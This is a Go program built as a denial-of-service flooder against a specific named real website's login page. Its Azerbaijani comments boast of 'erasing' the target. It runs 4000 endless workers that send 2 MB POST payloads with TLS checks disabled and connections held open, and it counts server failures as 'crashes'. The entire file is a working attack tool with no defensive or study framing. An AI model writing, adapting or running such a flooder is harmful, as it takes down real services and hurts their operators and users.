package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

func main() {
	target := "https://empro.az/#/login"
	// Railway resurslarını tükədən maksimum worker sayı
	workers := 4000 
	
	fmt.Printf("[!!!] HAKAI-OBLIVION AKTİVDİR. Hədəf Silinir: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			NextProtos:         []string{"h2", "http/1.1"},
		},
		MaxIdleConns:        100000,
		MaxIdleConnsPerHost: 50000,
		// Serverin TCP bağlantılarını qapatmasına icazə vermirik
		DisableKeepAlives: false, 
		IdleConnTimeout:   1 * time.Hour, // Bağlantını sonsuza qədər açıq tut
	}

	client := &http.Client{Transport: tr}
	var crashCount uint64

	var wg sync.WaitGroup
	// 2 MB Payload - Bu data serverin beynini yandıracaq
	payload := "void=" + strings.Repeat("0", 2097152) 

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Hər worker sonsuz bir döngüdə serverə zərbə vurur
				u := fmt.Sprintf("%s&infinite_loop=%d&kill_ts=%d", target, rand.Int(), time.Now().UnixNano())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Requested-With", "XMLHttpRequest")
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					// Body-ni heç vaxt dərhal bağlama (Serveri gözlət)
					time.Sleep(5 * time.Second) 
					resp.Body.Close()
				} else {
					atomic.AddUint64(&crashCount, 1)
					// Əgər bağlantı qurula bilmirsə (Timeout), deməli sayt dayanıb
					time.Sleep(10 * time.Millisecond)
				}
			}
		}(i)
	}

	// Səssiz Hesabat
	go func() {
		for {
			time.Sleep(3 * time.Second)
			fmt.Printf("[FATAL_SIGNAL] Çöküş Sayı: %d | Saytın bərpası bloklanıb.\n", atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}
